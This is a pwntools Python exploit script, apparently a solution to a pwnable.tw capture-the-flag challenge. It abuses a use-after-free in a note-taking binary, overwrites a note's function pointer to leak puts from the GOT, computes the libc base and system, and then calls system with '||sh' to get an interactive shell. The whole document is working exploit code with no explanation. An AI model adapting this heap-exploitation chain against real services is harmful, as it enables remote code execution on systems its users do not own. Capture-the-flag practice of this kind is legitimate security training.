from pwn import *
server = remote('chall.pwnable.tw',10102)

libc = ELF('./libc_32.so.6')

def add_note(size,content):
    server.recvuntil('Your choice :')
    server.sendline('1')
    server.recvuntil('Note size :')
    server.sendline(str(size))
    server.recvuntil('Content :')
    server.sendline(content)

def free_note(index):
    server.recvuntil('Your choice :')
    server.sendline('2')
    server.recvuntil('Index :')
    server.sendline(str(index))

def print_note(index):
    server.recvuntil('Your choice :')
    server.sendline('3')
    server.recvuntil('Index :')
    server.sendline(str(index))

puts_got_addr = 0x0804A024
print_content = 0x0804862B


add_note(32,"a"*32)
add_note(32,"b"*32)
free_note(0)
free_note(1)
add_note(8,p32(print_content)+p32(puts_got_addr))
print_note(0)

leak_puts_addr = u32(server.recv(4))
libcbase_addr = leak_puts_addr - libc.symbols['puts']
system_addr = libcbase_addr + libc.symbols['system']

free_note(2)
add_note(8,flat([system_addr,"||sh"]))
print_note(0)
server.interactive()

